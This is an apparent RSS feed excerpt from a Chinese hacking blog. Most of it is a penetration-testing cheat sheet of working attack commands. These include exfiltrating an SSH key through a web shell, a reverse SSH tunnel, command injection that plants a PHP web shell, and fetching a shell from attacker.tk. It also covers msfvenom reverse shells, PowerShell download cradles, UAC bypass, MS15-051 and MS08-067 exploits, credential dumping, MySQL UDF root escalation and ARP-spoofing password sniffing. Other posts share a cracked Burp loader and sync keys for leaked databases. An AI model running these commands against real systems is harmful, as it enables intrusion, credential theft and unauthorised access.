$ wget -O - -q &amp;ldquo;&lt;a href=&#34;http://domain.tk/sh.php?cmd=cat&#34; target=&#34;_blank&#34;&gt;http://domain.tk/sh.php?cmd=cat&lt;/a&gt; /tmp/id_rsa&amp;rdquo;&lt;/p&gt;

&lt;h1 id=&#34;增加用户-tempuser&#34;&gt;增加用户 tempuser&lt;/h1&gt;

&lt;p&gt;$ useradd -m tempuser&lt;br /&gt;
$ mkdir /home/tempuser/.ssh &amp;amp;&amp;amp; chmod 700 /home/tempuser/.ssh&lt;br /&gt;
$ wget -O - -q &amp;ldquo;&lt;a href=&#34;http://domain.tk/sh.php?cmd=cat&#34; target=&#34;_blank&#34;&gt;http://domain.tk/sh.php?cmd=cat&lt;/a&gt; /tmp/id_rsa&amp;rdquo; &amp;gt; /home/tempuser/.ssh/authorized_keys&lt;br /&gt;
$ chmod 700 /home/tempuser/.ssh/authorized_keys&lt;br /&gt;
$ chown -R tempuser:tempuser /home/tempuser/.ssh&lt;/p&gt;

&lt;h1 id=&#34;反弹-ssh-shell&#34;&gt;反弹 ssh shell&lt;/h1&gt;

&lt;p&gt;$ wget -O - -q &amp;ldquo;&lt;a href=&#34;http://domain.tk/sh.php?cmd=ssh&#34; target=&#34;_blank&#34;&gt;http://domain.tk/sh.php?cmd=ssh&lt;/a&gt; -i /tmp/id_rsa -o StrictHostKeyChecking=no -R 127.0.0.1:8080:192.168.20.13:8080 -N -f tempuser@&lt;attacker_ip&gt;&amp;ldquo;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;利用 POST 远程命令执行获取 Shell  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;attacker:~$ curl -i -s -k  -X &amp;lsquo;POST&amp;rsquo; &amp;ndash;data-binary $&amp;lsquo;IP=%3Bwhoami&amp;amp;submit=submit&amp;rsquo; &amp;lsquo;&lt;a href=&#34;http://victum.tk/command.php&#39;&#34; target=&#34;_blank&#34;&gt;http://victum.tk/command.php&#39;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;attacker:~$ curl -i -s -k  -X &amp;lsquo;POST&amp;rsquo; &amp;ndash;data-binary $&amp;lsquo;IP=%3Becho+%27%3C%3Fphp+system%28%24_GET%5B%22cmd%22%5D%29%3B+%3F%3E%27+%3E+..%2Fshell.php&amp;amp;submit=submit&amp;rsquo; &amp;lsquo;&lt;a href=&#34;http://victum.tk/command.php&#39;&#34; target=&#34;_blank&#34;&gt;http://victum.tk/command.php&#39;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;attacker:~$ curl &lt;a href=&#34;http://victum.tk/shell.php?cmd=id&#34; target=&#34;_blank&#34;&gt;http://victum.tk/shell.php?cmd=id&lt;/a&gt;&lt;/p&gt;

&lt;h1 id=&#34;在服务器上下载-shell-phpshell-php&#34;&gt;在服务器上下载 shell (phpshell.php)&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://victum.tk/shell.php?cmd=php%20-r%20%27file_put_contents%28%22phpshell.php%22,%20fopen%28%22http://attacker.tk/phpshell.txt%22,%20%27r%27%29%29;%27&#34; target=&#34;_blank&#34;&gt;http://victum.tk/shell.php?cmd=php%20-r%20%27file_put_contents%28%22phpshell.php%22,%20fopen%28%22http://attacker.tk/phpshell.txt%22,%20%27r%27%29%29;%27&lt;/a&gt;&lt;/p&gt;

&lt;h1 id=&#34;运行-nc-并执行-phpshell-php&#34;&gt;运行 nc 并执行 phpshell.php&lt;/h1&gt;

&lt;p&gt;attacker:~$ nc -nvlp 1337&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;以管理员身份在 Win7 上反弹具有系统权限的 Shell  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;msfvenom –p windows/shell_reverse_tcp LHOST=192.168.56.102 –f exe &amp;gt; danger.exe&lt;/p&gt;

&lt;h1 id=&#34;显示账户配置&#34;&gt;显示账户配置&lt;/h1&gt;

&lt;p&gt;net user &lt;login&gt;&lt;/p&gt;

&lt;h1 id=&#34;kali-上下载-psexec&#34;&gt;Kali 上下载 psexec&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;https://technet.microsoft.com/en-us/sysinternals/bb897553.aspx&#34; target=&#34;_blank&#34;&gt;https://technet.microsoft.com/en-us/sysinternals/bb897553.aspx&lt;/a&gt;&lt;/p&gt;

&lt;h1 id=&#34;使用-powershell-脚本上传-psexec-exe-到目标机器&#34;&gt;使用 powershell 脚本上传 psexec.exe 到目标机器&lt;/h1&gt;

&lt;p&gt;echo $client = New-Object System.Net.WebClient &amp;gt; script.ps1&lt;br /&gt;
echo $targetlocation = &amp;ldquo;&lt;a href=&#34;http://192.168.56.102/PsExec.exe&amp;quot;&#34; target=&#34;_blank&#34;&gt;http://192.168.56.102/PsExec.exe&amp;quot;&lt;/a&gt; &amp;gt;&amp;gt; script.ps1&lt;br /&gt;
echo $client.DownloadFile($targetlocation,&amp;ldquo;psexec.exe&amp;rdquo;) &amp;gt;&amp;gt; script.ps1&lt;br /&gt;
powershell.exe -ExecutionPolicy Bypass -NonInteractive -File script.ps1&lt;/p&gt;

&lt;h1 id=&#34;使用-powershell-脚本上传-danger-exe-到目标机器&#34;&gt;使用 powershell 脚本上传 danger.exe 到目标机器&lt;/h1&gt;

&lt;p&gt;echo $client = New-Object System.Net.WebClient &amp;gt; script2.ps1&lt;br /&gt;
echo $targetlocation = &amp;ldquo;&lt;a href=&#34;http://192.168.56.102/danger.exe&amp;quot;&#34; target=&#34;_blank&#34;&gt;http://192.168.56.102/danger.exe&amp;quot;&lt;/a&gt; &amp;gt;&amp;gt; script2.ps1&lt;br /&gt;
echo $client.DownloadFile($targetlocation,&amp;ldquo;danger.exe&amp;rdquo;) &amp;gt;&amp;gt; script2.ps1&lt;br /&gt;
powershell.exe -ExecutionPolicy Bypass -NonInteractive -File script2.ps1&lt;/p&gt;

&lt;h1 id=&#34;使用预编译的二进制文件绕过-uac&#34;&gt;使用预编译的二进制文件绕过 UAC:&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;https://github.com/hfiref0x/UACME&#34; target=&#34;_blank&#34;&gt;https://github.com/hfiref0x/UACME&lt;/a&gt;&lt;/p&gt;

&lt;h1 id=&#34;使用-powershell-脚本上传-https-github-com-hfiref0x-uacme-blob-master-compiled-akagi64-exe-到目标机器&#34;&gt;使用 powershell 脚本上传 &lt;a href=&#34;https://github.com/hfiref0x/UACME/blob/master/Compiled/Akagi64.exe&#34; target=&#34;_blank&#34;&gt;https://github.com/hfiref0x/UACME/blob/master/Compiled/Akagi64.exe&lt;/a&gt; 到目标机器&lt;/h1&gt;

&lt;p&gt;echo $client = New-Object System.Net.WebClient &amp;gt; script2.ps1&lt;br /&gt;
echo $targetlocation = &amp;ldquo;&lt;a href=&#34;http://192.168.56.102/Akagi64.exe&amp;quot;&#34; target=&#34;_blank&#34;&gt;http://192.168.56.102/Akagi64.exe&amp;quot;&lt;/a&gt; &amp;gt;&amp;gt; script3.ps1&lt;br /&gt;
echo $client.DownloadFile($targetlocation,&amp;ldquo;Akagi64.exe&amp;rdquo;) &amp;gt;&amp;gt; script3.ps1&lt;br /&gt;
powershell.exe -ExecutionPolicy Bypass -NonInteractive -File script3.ps1&lt;/p&gt;

&lt;h1 id=&#34;在-kali-上创建监听&#34;&gt;在 Kali 上创建监听&lt;/h1&gt;

&lt;p&gt;nc -lvp 4444&lt;/p&gt;

&lt;h1 id=&#34;以系统权限使用-akagi64-运行-danger-exe&#34;&gt;以系统权限使用 Akagi64 运行 danger.exe&lt;/h1&gt;

&lt;p&gt;Akagi64.exe 1 C:\Users\User\Desktop\danger.exe&lt;/p&gt;

&lt;h1 id=&#34;在-kali-上创建监听-1&#34;&gt;在 Kali 上创建监听&lt;/h1&gt;

&lt;p&gt;nc -lvp 4444&lt;/p&gt;

&lt;h1 id=&#34;下一步就会反弹给我们一个提过权的-shell&#34;&gt;下一步就会反弹给我们一个提过权的 shell&lt;/h1&gt;

&lt;h1 id=&#34;以系统权限使用-psexec-运行-danger-exe&#34;&gt;以系统权限使用 PsExec 运行 danger.exe&lt;/h1&gt;

&lt;p&gt;psexec.exe –i –d –accepteula –s danger.exe&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;以普通用户身份在 Win7 上反弹具有系统权限的 Shell  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;a href=&#34;https://technet.microsoft.com/en-us/security/bulletin/dn602597.aspx&#34; target=&#34;_blank&#34;&gt;https://technet.microsoft.com/en-us/security/bulletin/dn602597.aspx&lt;/a&gt; #ms15-051&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://www.fireeye.com/blog/threat-research/2015/04/probable_apt28_useo.html&#34; target=&#34;_blank&#34;&gt;https://www.fireeye.com/blog/threat-research/2015/04/probable_apt28_useo.html&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://www.exploit-db.com/exploits/37049/&#34; target=&#34;_blank&#34;&gt;https://www.exploit-db.com/exploits/37049/&lt;/a&gt;&lt;/p&gt;

&lt;h1 id=&#34;查找目标机器是否安装了补丁-输入如下命令&#34;&gt;查找目标机器是否安装了补丁，输入如下命令&lt;/h1&gt;

&lt;p&gt;wmic qfe get&lt;br /&gt;
wmic qfe | find &amp;ldquo;3057191&amp;rdquo;&lt;/p&gt;

&lt;h1 id=&#34;上传编译后的利用程序并运行它&#34;&gt;上传编译后的利用程序并运行它&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;https://github.com/hfiref0x/CVE-2015-1701/raw/master/Compiled/Taihou64.exe&#34; target=&#34;_blank&#34;&gt;https://github.com/hfiref0x/CVE-2015-1701/raw/master/Compiled/Taihou64.exe&lt;/a&gt;&lt;/p&gt;

&lt;h1 id=&#34;默认情况下其会以系统权限执行-cmd-exe-但我们需要改变源代码以运行我们上传的-danger-exe&#34;&gt;默认情况下其会以系统权限执行 cmd.exe，但我们需要改变源代码以运行我们上传的 danger.exe&lt;/h1&gt;

&lt;h1 id=&#34;https-github-com-hfiref0x-cve-2015-1701-下载它并定位到-main-c&#34;&gt;&lt;a href=&#34;https://github.com/hfiref0x/CVE-2015-1701&#34; target=&#34;_blank&#34;&gt;https://github.com/hfiref0x/CVE-2015-1701&lt;/a&gt; 下载它并定位到 &amp;ldquo;main.c&amp;rdquo;&lt;/h1&gt;

&lt;h1 id=&#34;使用-wce-exe-获取已登录用户的明文账号密码&#34;&gt;使用 wce.exe 获取已登录用户的明文账号密码&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://www.ampliasecurity.com/research/windows-credentials-editor/&#34; target=&#34;_blank&#34;&gt;http://www.ampliasecurity.com/research/windows-credentials-editor/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;wce -w&lt;/p&gt;

&lt;h1 id=&#34;使用-pwdump7-获取其他用户的密码哈希值&#34;&gt;使用 pwdump7 获取其他用户的密码哈希值&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://www.heise.de/download/pwdump.html&#34; target=&#34;_blank&#34;&gt;http://www.heise.de/download/pwdump.html&lt;/a&gt;&lt;/p&gt;

&lt;h1 id=&#34;we-can-try-online-hash-cracking-tools-such-crackstation-net&#34;&gt;we can try online hash cracking tools such crackstation.net&lt;/h1&gt;

&lt;p&gt;MS08-067 – 不使用 Metasploit&lt;/p&gt;

&lt;p&gt;$ nmap -v -p 139, 445 &amp;ndash;script=smb-check-vulns &amp;ndash;script-args=unsafe=1 192.168.31.205&lt;br /&gt;
$ searchsploit ms08-067&lt;br /&gt;
$ python /usr/share/exploitdb/platforms/windows/remote/7132.py 192.168.31.205 1&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;通过 MySQL Root 账户实现提权  
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&#34;mysql-server-version-5-5-44-0ubuntu0-14-04-1-ubuntu&#34;&gt;Mysql Server version: 5.5.44-0ubuntu0.14.04.1 (Ubuntu)&lt;/h1&gt;

&lt;p&gt;$ wget 0xdeadbeef.info/exploits/raptor_udf2.c&lt;br /&gt;
$ gcc -g -c raptor_udf2.c&lt;br /&gt;
$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc&lt;br /&gt;
mysql -u root -p&lt;br /&gt;
mysql&amp;gt; use mysql;&lt;br /&gt;
mysql&amp;gt; create table foo(line blob);&lt;br /&gt;
mysql&amp;gt; insert into foo values(load_file(&amp;lsquo;/home/user/raptor_udf2.so&amp;rsquo;));&lt;br /&gt;
mysql&amp;gt; select * from foo into dumpfile &amp;lsquo;/usr/lib/mysql/plugin/raptor_udf2.so&amp;rsquo;;&lt;br /&gt;
mysql&amp;gt; create function do_system returns integer soname &amp;lsquo;raptor_udf2.so&amp;rsquo;;&lt;br /&gt;
mysql&amp;gt; select * from mysql.func;&lt;br /&gt;
mysql&amp;gt; select do_system(&amp;lsquo;echo &amp;ldquo;root:passwd&amp;rdquo; | chpasswd &amp;gt; /tmp/out; chown user:user /tmp/out&amp;rsquo;);&lt;/p&gt;

&lt;p&gt;user:~$ su -&lt;br /&gt;
Password:&lt;br /&gt;
user:~# whoami&lt;br /&gt;
root&lt;br /&gt;
root:~# id&lt;br /&gt;
uid=0(root) gid=0(root) groups=0(root)&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;使用 LD_PRELOAD 注入程序  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;$ wget &lt;a href=&#34;https://github.com/jivoi/pentest/ldpreload_shell.c&#34; target=&#34;_blank&#34;&gt;https://github.com/jivoi/pentest/ldpreload_shell.c&lt;/a&gt;&lt;br /&gt;
$ gcc -shared -fPIC ldpreload_shell.c -o ldpreload_shell.so&lt;br /&gt;
$ sudo -u user LD_PRELOAD=/tmp/ldpreload_shell.so /usr/local/bin/somesoft&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;针对 OpenSSH 用户进行枚举时序攻击  

注：枚举时序攻击(“Enumeration Timing Attack”)属于侧信道攻击/旁路攻击(Side Channel Attack)，侧信道攻击是指利用信道外的信息，比如加解密的速度/加解密时芯片引脚的电压/密文传输的流量和途径等进行攻击的方式，一个词形容就是“旁敲侧击”。–参考自 shotgun 在知乎上的解释。  

osueta 是一个用于对 OpenSSH 进行时序攻击的 python2 脚本，其可以利用时序攻击枚举 OpenSSH 用户名，并在一定条件下可以对 OpenSSH 服务器进行 DOS 攻击。  
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&#34;https-github-com-c0r3dump3d-osueta&#34;&gt;&lt;a href=&#34;https://github.com/c0r3dump3d/osueta&#34; target=&#34;_blank&#34;&gt;https://github.com/c0r3dump3d/osueta&lt;/a&gt;&lt;/h1&gt;

&lt;p&gt;$ ./osueta.py -H 192.168.1.6 -p 22 -U root -d 30 -v yes&lt;br /&gt;
$ ./osueta.py -H 192.168.10.22 -p 22 -d 15 -v yes –dos no -L userfile.txt&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;使用 ReDuh 构造合法的 HTTP 请求以建立 TCP 通道  

注： ReDuh 是一个通过 HTTP 协议建立隧道传输各种其他数据的工具。其可以把内网服务器的端口通过 http/https 隧道转发到本机，形成一个连通回路。用于目标服务器在内网或做了端口策略的情况下连接目标服务器内部开放端口。  

对了亲～ReDuh-Gui 号称端口转发神器哦。  
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&#34;https-github-com-sensepost-reduh&#34;&gt;&lt;a href=&#34;https://github.com/sensepost/reDuh&#34; target=&#34;_blank&#34;&gt;https://github.com/sensepost/reDuh&lt;/a&gt;&lt;/h1&gt;

&lt;h1 id=&#34;步骤-1&#34;&gt;步骤 1&lt;/h1&gt;

&lt;h1 id=&#34;上传-reduh-jsp-目标服务器&#34;&gt;上传 reDuh.jsp 目标服务器&lt;/h1&gt;

&lt;p&gt;$ &lt;a href=&#34;http://192.168.10.50/uploads/reDuh.jsp&#34; target=&#34;_blank&#34;&gt;http://192.168.10.50/uploads/reDuh.jsp&lt;/a&gt;&lt;/p&gt;

&lt;h1 id=&#34;步骤-2&#34;&gt;步骤 2&lt;/h1&gt;

&lt;h1 id=&#34;在本机运行-reduhclient&#34;&gt;在本机运行 reDuhClient&lt;/h1&gt;

&lt;p&gt;$ java -jar reDuhClient.jar &lt;a href=&#34;http://192.168.10.50/uploads/reDuh.jsp&#34; target=&#34;_blank&#34;&gt;http://192.168.10.50/uploads/reDuh.jsp&lt;/a&gt;&lt;/p&gt;

&lt;h1 id=&#34;步骤-3&#34;&gt;步骤 3&lt;/h1&gt;

&lt;h1 id=&#34;使用-nc-连接管理端口&#34;&gt;使用 nc 连接管理端口&lt;/h1&gt;

&lt;p&gt;$ nc -nvv 127.0.0.1 1010&lt;/p&gt;

&lt;h1 id=&#34;步骤-4&#34;&gt;步骤 4&lt;/h1&gt;

&lt;h1 id=&#34;使用隧道转发本地端口到远程目标端口&#34;&gt;使用隧道转发本地端口到远程目标端口&lt;/h1&gt;

&lt;p&gt;[createTunnel] 7777:172.16.0.4:3389&lt;/p&gt;

&lt;h1 id=&#34;步骤-5&#34;&gt;步骤 5&lt;/h1&gt;

&lt;h1 id=&#34;使用-rdp-连接远程&#34;&gt;使用 RDP 连接远程&lt;/h1&gt;

&lt;p&gt;$ /usr/bin/rdesktop -g 1024x768 -P -z -x l -k en-us -r sound:off localhost:7777&lt;br /&gt;
```&lt;/p&gt;
</description>
        </item>
        
        <item>
            <title>ARPspoof</title>
            <link>http://blog.pytool.com/hacker/02_%E6%AC%BA%E9%AA%97%E5%97%85%E6%8E%A2/2016-03-29-arpspoof/</link>
            <pubDate>Tue, 29 Mar 2016 21:25:45 CST</pubDate>
            <author>rinetd</author>
            <guid>http://blog.pytool.com/hacker/02_%E6%AC%BA%E9%AA%97%E5%97%85%E6%8E%A2/2016-03-29-arpspoof/</guid>
            <description>

&lt;p&gt;[](&lt;a href=&#34;https://wizardforcel.gitbooks.io/daxueba-kali-linux-tutorial/content/58.html&#34; target=&#34;_blank&#34;&gt;https://wizardforcel.gitbooks.io/daxueba-kali-linux-tutorial/content/58.html&lt;/a&gt;)&lt;/p&gt;

&lt;p&gt;Usage: arpspoof [-i interface] [-t target] host&lt;br /&gt;
    -i interface 指定使用的网卡&lt;br /&gt;
    -c own|host|both 攻击结束后如何恢复&lt;br /&gt;
    -r              双向毒化&lt;br /&gt;
    -t target 指定要攻击的目标&lt;br /&gt;
    host            指定要拦截的主机(默认为网关)&lt;/p&gt;

&lt;p&gt;启动Arpspoof注入攻击目标系统。攻击的方法是攻击者（192.168.6.100）发送ARP数据包，以欺骗网关（192.168.6.1）和目标系统（192.168.6.101）。&lt;br /&gt;
1. 下面首先欺骗目标系统，执行命令如下所示：&lt;br /&gt;
&lt;code&gt;arpspoof -i eth0 -t 192.168.6.101 192.168.6.1&lt;/code&gt;&lt;br /&gt;
2. 使用Arpspoof欺骗网关。执行命令如下所示：&lt;br /&gt;
&lt;code&gt;arpspoof -i eth0 -t 192.168.6.1 192.168.6.101&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;##########&lt;br /&gt;
Don&amp;rsquo;t forget to enable IP forwarding on your host so that the traffic goes through your host. Otherwise victim will loose connectivity.&lt;/p&gt;

&lt;h1 id=&#34;echo-1-proc-sys-net-ipv4-ip-forward&#34;&gt;echo 1 &amp;gt; /proc/sys/net/ipv4/ip_forward&lt;/h1&gt;

&lt;p&gt;In order to tell the victim host that now we (our MAC address) are the one belonging to the IP of the gateway enter the following command:&lt;/p&gt;

&lt;h1 id=&#34;arpspoof-t-victim-gateway&#34;&gt;arpspoof -t victim gateway&lt;/h1&gt;

&lt;p&gt;In a seperate shell we start the matching command to fool gateway to belive we are victim.&lt;/p&gt;

&lt;h1 id=&#34;arpspoof-t-gateway-victim&#34;&gt;arpspoof -t gateway victim&lt;/h1&gt;
</description>
        </item>
        
        <item>
            <title>BTsync</title>
            <link>http://blog.pytool.com/hacker/2016-10-22-btsync/</link>
            <pubDate>Tue, 29 Mar 2016 21:25:45 CST</pubDate>
            <author>rinetd</author>
            <guid>http://blog.pytool.com/hacker/2016-10-22-btsync/</guid>
            <description>&lt;p&gt;最近几年网上泄露、流传出来的各种数据库，已收集有70G+&lt;/p&gt;

&lt;p&gt;BtSync密钥：BHMIILA2HRJ5ZG6FN6KE7YUKBZMQOFCOA&lt;/p&gt;

&lt;p&gt;linux、python、shell、php、web前端、互联网&amp;hellip;&lt;br /&gt;
btsync: BI3ACGSYU7DTURRU44AKLJ6FQNYXZG64P&lt;br /&gt;
在Newsfeed关注&lt;br /&gt;
KINDLE精品电子书资源&lt;br /&gt;
BitTorrent Sync:BLE2YCVCA3JPQCRZGDQVTFTKQYPDH5MQC&lt;/p&gt;

&lt;p&gt;导航密钥（大家共同分享）&lt;br /&gt;
AAXVLKUOK5UVP2C3YFKNJJ5SFYALP2DKU&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://mega.nz/#F!GJlE3QDY!322d8-f-7QOwPgxfKTUOzw&#34; target=&#34;_blank&#34;&gt;https://mega.nz/#F!GJlE3QDY!322d8-f-7QOwPgxfKTUOzw&lt;/a&gt;&lt;/p&gt;
</description>
        </item>
        
        <item>
            <title>BurpsSuite</title>
            <link>http://blog.pytool.com/hacker/2016-03-29-burpsuite/</link>
            <pubDate>Tue, 29 Mar 2016 21:25:45 CST</pubDate>
            <author>rinetd</author>
            <guid>http://blog.pytool.com/hacker/2016-03-29-burpsuite/</guid>
            <description>

&lt;p&gt;Windows 下启动 BurpsSuite&lt;br /&gt;
&lt;code&gt;java.exe -cp BurpLoader.jar;burpsuite_pro_v1.7.03.jar larry.lau.BurpLoader&lt;/code&gt;&lt;br /&gt;
java -jar BurpLoader.jar&lt;br /&gt;
java -cp BurpLoader.jar;burpsuite_pro.jar larry.lau.BurpLoader&lt;br /&gt;
java -cp BurpLoader.jar:burpsuite_pro.jar larry.lau.BurpLoader&lt;/p&gt;

&lt;p&gt;&lt;code&gt;java -jar Cknife.jar&lt;/code&gt;&lt;br /&gt;
&lt;a href=&#34;https://support.portswigger.net/customer/portal/articles/1783087-Installing_Installing%20CA%20Certificate%20-%20FF.html&#34; target=&#34;_blank&#34;&gt;PortSwigger CA&lt;/a&gt;&lt;br /&gt;
&lt;a href=&#34;http://drops.wooyun.org/tools/1548&#34; target=&#34;_blank&#34;&gt;Burp Suite使用介绍&lt;/a&gt;&lt;br /&gt;
&lt;a href=&#34;https://t0data.gitbooks.io/burpsuite/content/&#34; target=&#34;_blank&#34;&gt;book burpsuite实战指南&lt;/a&gt;&lt;br /&gt;
&lt;a href=&#34;https://yw9381.gitbooks.io/burp_suite_doc_zh_cn/content/&#34; target=&#34;_blank&#34;&gt;Burp Suite 官方文档中文版&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;java -jar BurpLoader.jar &amp;ndash;help&lt;/p&gt;

&lt;h1 id=&#34;插件安装目录&#34;&gt;插件安装目录&lt;/h1&gt;

&lt;p&gt;~/.Burpsuite/bapps/&lt;/p&gt;

&lt;h1 id=&#34;intercept-拦截规则&#34;&gt;[Intercept 拦截规则]&lt;/h1&gt;

&lt;h1 id=&#34;intruder-自动攻击&#34;&gt;[Intruder 自动攻击]&lt;/h1&gt;

&lt;p&gt;Creating a Custom CA Certificate&lt;/p&gt;

&lt;p&gt;You can use the following OpenSSL commands to create a custom CA certificate with your own details, such as CA name:&lt;/p&gt;

&lt;p&gt;openssl req -x509 -days 730 -nodes -newkey rsa:2048 -outform der -keyout server.key -out ca.der&lt;/p&gt;

&lt;p&gt;[OpenSSL will prompt you to enter various details for the certificate. Be sure to enter suitable values for all the prompted items.]&lt;/p&gt;

&lt;p&gt;openssl rsa -in server.key -inform pem -out server.key.der -outform der&lt;/p&gt;

&lt;p&gt;openssl pkcs8 -topk8 -in server.key.der -inform der -out server.key.pkcs8.der -outform der -nocrypt&lt;/p&gt;

&lt;p&gt;Then click on the &amp;ldquo;Import / export CA certificate&amp;rdquo; button in Burp, and select &amp;ldquo;Cert and key in DER format&amp;rdquo;. Select ca.der as the certificate file, and server.key.pkcs8.der as the key file. Burp will then load the custom CA certificate and begin using it to generate per-host certificates.&lt;/p&gt;
</description>
        </item>
        
        <item>
            <title>CMS检测</title>
            <link>http://blog.pytool.com/hacker/01_%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/2017-06-29-cms%E6%A3%80%E6%B5%8B/</link>
            <pubDate>Tue, 29 Mar 2016 21:25:45 CST</pubDate>
            <author>rinetd</author>
            <guid>http://blog.pytool.com/hacker/01_%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/2017-06-29-cms%E6%A3%80%E6%B5%8B/</guid>
            <description>&lt;p&gt;&lt;a href=&#34;https://github.com/Dionach/CMSmap&#34; target=&#34;_blank&#34;&gt;https://github.com/Dionach/CMSmap&lt;/a&gt;
 cmsmap.py -t &lt;a href=&#34;https://example.com&#34; target=&#34;_blank&#34;&gt;https://example.com&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://www.freebuf.com/news/137497.html&#34; target=&#34;_blank&#34;&gt;手工检测Web应用指纹的一些技巧&lt;/a&gt;&lt;/p&gt;
</description>
        </item>
        
        <item>
            <title>Dsniff</title>
            <link>http://blog.pytool.com/hacker/02_%E6%AC%BA%E9%AA%97%E5%97%85%E6%8E%A2/2016-03-29-dsniff/</link>
            <pubDate>Tue, 29 Mar 2016 21:25:45 CST</pubDate>
            <author>rinetd</author>
            <guid>http://blog.pytool.com/hacker/02_%E6%AC%BA%E9%AA%97%E5%97%85%E6%8E%A2/2016-03-29-dsniff/</guid>
            <description>

&lt;p&gt;Dsniff是一个非常强大的工具套件，它被用来进行渗透测试。它被用来实施嗅探、网络分析等。它能够捕捉各种协议。ARPspoof和driftnet也是dsniff套件的一部分，当然还有其他套件，如：&lt;/p&gt;

&lt;p&gt;Msgsnarf&lt;br /&gt;
Urlsnarf&lt;br /&gt;
Mailsnarf&lt;br /&gt;
Filesnarf&lt;br /&gt;
dnsspoof&lt;/p&gt;

&lt;p&gt;在如下攻击场景中：&lt;/p&gt;

&lt;p&gt;攻击者IP： 192.168.1.12&lt;br /&gt;
被攻击主机IP:192.168.1.6&lt;br /&gt;
路由(网关)IP：192.168.1.1&lt;/p&gt;

&lt;p&gt;################################################################################&lt;br /&gt;
[](&lt;a href=&#34;https://wizardforcel.gitbooks.io/daxueba-kali-linux-tutorial/content/58.html&#34; target=&#34;_blank&#34;&gt;https://wizardforcel.gitbooks.io/daxueba-kali-linux-tutorial/content/58.html&lt;/a&gt;)&lt;/p&gt;

&lt;p&gt;Usage: arpspoof [-i interface] [-t target] host&lt;br /&gt;
    -i interface 指定使用的网卡&lt;br /&gt;
    -c own|host|both 攻击结束后如何恢复&lt;br /&gt;
    -r              双向毒化&lt;br /&gt;
    -t target 指定要攻击的目标&lt;br /&gt;
    host            指定要拦截的主机(默认为网关)&lt;/p&gt;

&lt;p&gt;启动Arpspoof注入攻击目标系统。攻击的方法是攻击者（192.168.6.100）发送ARP数据包，以欺骗网关（192.168.6.1）和目标系统（192.168.6.101）。&lt;br /&gt;
1. 下面首先欺骗目标系统，执行命令如下所示：&lt;br /&gt;
&lt;code&gt;arpspoof -i eth0 -t 192.168.6.101 192.168.6.1&lt;/code&gt;&lt;br /&gt;
2. 使用Arpspoof欺骗网关。执行命令如下所示：&lt;br /&gt;
&lt;code&gt;arpspoof -i eth0 -t 192.168.6.1 192.168.6.101&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;##########&lt;br /&gt;
Don&amp;rsquo;t forget to enable IP forwarding on your host so that the traffic goes through your host. Otherwise victim will loose connectivity.&lt;/p&gt;

&lt;h1 id=&#34;echo-1-proc-sys-net-ipv4-ip-forward&#34;&gt;echo 1 &amp;gt; /proc/sys/net/ipv4/ip_forward&lt;/h1&gt;

&lt;p&gt;In order to tell the victim host that now we (our MAC address) are the one belonging to the IP of the gateway enter the following command:&lt;/p&gt;

&lt;h1 id=&#34;arpspoof-t-victim-gateway&#34;&gt;arpspoof -t victim gateway&lt;/h1&gt;

&lt;p&gt;In a seperate shell we start the matching command to fool gateway to belive we are victim.&lt;/p&gt;

&lt;h1 id=&#34;arpspoof-t-gateway-victim&#34;&gt;arpspoof -t gateway victim&lt;/h1&gt;

&lt;p&gt;################################################################################&lt;/p&gt;

&lt;p&gt;让我们开始进行ARPspoof IP转发攻击：&lt;/p&gt;

&lt;p&gt;root@bt:~# echo 1 &amp;gt;&amp;gt; /proc/sys/net/ipv4/ip_forwardroot@bt:~# arpspoof -i eth0 -t 192.168.1.6 192.168.1.1root@bt:~# arpspoof -i eth0 -t 192.168.1.1 192.168.1.12&lt;/p&gt;

&lt;p&gt;我刚刚启用端口转发，之后使用arpspoof（dsniff的一个插件）来执行ARP毒化攻击。开启dsniff来捕获已知协议获取密码。&lt;/p&gt;

&lt;p&gt;root@bt:~# &lt;code&gt;dsniff -i eth0&lt;/code&gt;&lt;br /&gt;
dsniff: listening on eth0&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;如图所示，dsniff成功从受害者主机上捕获了FTP的用户名和密码，尽管这个密码是不正确的，但dsniff可以捕获受害者发送的信息。  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;因为攻击者的主机作为了默认的路由器（因为进行了ARP欺骗），因此受害主机传输的数据经过攻击者，攻击者很容易可以嗅探到受害者发送的信息。我们可以arpspoof所有网段内的主机，但我们的示例中只ARP欺骗了单个主机。你可以试试其他的dsniif工具，像urlsnarf。&lt;/p&gt;

&lt;p&gt;root@bt:~# &lt;code&gt;urlsnarf -i eth0&lt;/code&gt;&lt;br /&gt;
urlsnarf: listening on eth0 [tcp port 80 or port 8080 or port 3128]&lt;/p&gt;

